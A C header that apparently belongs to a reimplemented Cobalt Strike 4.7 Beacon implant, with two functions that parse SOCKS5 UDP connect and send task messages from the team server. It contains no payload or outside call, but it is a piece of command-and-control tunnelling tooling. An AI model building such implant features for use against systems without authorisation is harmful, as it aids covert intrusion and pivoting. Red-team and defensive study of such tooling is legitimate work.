#pragma once
/* SOCKS5 UDP task payloads (CS 4.7). Big-endian, matching
 * BeaconProxyListener.connectUDPMessage / writeMessage_udp. */
#include <winsock2.h>
#include <string.h>

static int socks_udp_parse_connect(char * buffer, int length, unsigned int * id, unsigned short * port, char * host, int hostmax) {
	unsigned int nid;
	unsigned short nport;
	int hlen;
	if (buffer == NULL || length < 6 || id == NULL || port == NULL || host == NULL || hostmax <= 1)
		return 0;
	memcpy(&nid, buffer, 4);
	*id = ntohl(nid);
	memcpy(&nport, buffer + 4, 2);
	*port = ntohs(nport);
	hlen = length - 6;
	if (hlen >= hostmax)
		hlen = hostmax - 1;
	memcpy(host, buffer + 6, hlen);
	host[hlen] = '\0';
	return 1;
}

static int socks_udp_parse_send(char * buffer, int length, unsigned int * id, unsigned short * port, char * host, int hostmax, char ** data, int * dlen) {
	unsigned int nid;
	unsigned int hlen;
	unsigned short nport;
	if (buffer == NULL || length < 10 || id == NULL || port == NULL || host == NULL || hostmax <= 1 || data == NULL || dlen == NULL)
		return 0;
	memcpy(&nid, buffer, 4);
	*id = ntohl(nid);
	memcpy(&nport, buffer + 4, 2);
	*port = ntohs(nport);
	memcpy(&hlen, buffer + 6, 4);
	hlen = ntohl(hlen);
	if (hlen >= (unsigned int)hostmax)
		hlen = (unsigned int)(hostmax - 1);
	if (10 + (int)hlen > length)
		return 0;
	memcpy(host, buffer + 10, hlen);
	host[hlen] = '\0';
	*data = buffer + 10 + (int)hlen;
	*dlen = length - 10 - (int)hlen;
	if (*dlen < 0)
		*dlen = 0;
	return 1;
}
